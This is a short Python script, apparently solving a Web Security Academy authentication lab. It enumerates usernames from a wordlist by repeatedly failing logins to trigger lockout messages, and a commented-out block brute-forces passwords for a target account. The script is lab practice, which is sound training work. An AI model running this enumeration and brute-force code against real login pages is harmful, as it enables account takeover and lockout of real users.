import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()

site = 'accd1f6e1f93ab8d80b9a9e80025008c.web-security-academy.net'

login_url = f'''https://{site}/login'''

resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')

lines = open("auth-lab-usernames","r").readlines()

def try_target(username):
  ...
  logindata = {
      'username' : f'{username}',
      'password' : 'foo'
  }
  for i in range(6):
      resp = s.post(login_url, data=logindata)
  ...
  return resp.text

for user in lines:
    target = user.strip()
    '''
    logindata = {
        'username' : 'carlos',
        'password' : target
    }

    
    def login_wiener():
      logindata = {
        'username' : 'wiener',
        'password' : 'peter'
      }
      s.post(login_url, data=logindata)
    
    login_wiener()
    
    resp = s.post(login_url, data=logindata)
    '''
    resptxt = try_target(target)
    soup = BeautifulSoup(resptxt,'html.parser')
    try:
      if 'password' not in soup.find('p', {'class':'is-warning'}).text:
          print(soup.find('p', {'class':'is-warning'}).text)
          print(f'username is {target}')
          break
    
    except:
      print(f'username is {target}')
      break
    


s.get(f'https://{site}/my-account?id={target}')

'''Username for part 5'''